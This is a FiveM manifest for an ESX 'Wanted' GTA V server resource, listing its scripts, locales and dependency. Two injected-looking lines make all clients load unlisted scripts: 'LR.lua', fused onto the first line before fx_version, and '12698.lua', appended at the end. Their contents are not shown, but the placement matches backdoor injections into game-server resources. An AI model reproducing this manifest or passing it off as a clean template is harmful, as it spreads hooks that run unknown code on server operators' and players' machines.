client_script 'LR.lua';fx_version 'adamant'

game 'gta5'

description 'ESX Wanted'

version '1.0.0'

server_scripts {
	'@mysql-async/lib/MySQL.lua',
	'@es_extended/locale.lua',
	'locales/tw.lua',
	'locales/en.lua',
	'locales/de.lua',
	'locales/fr.lua',
	'config.lua',
	'server/main.lua'
}

client_scripts {
	'@es_extended/locale.lua',
	'locales/tw.lua',
	'locales/en.lua',
	'locales/de.lua',
	'locales/fr.lua',
	'config.lua',
	'client/main.lua'
}

dependencies {
	'es_extended'
}

client_script '12698.lua'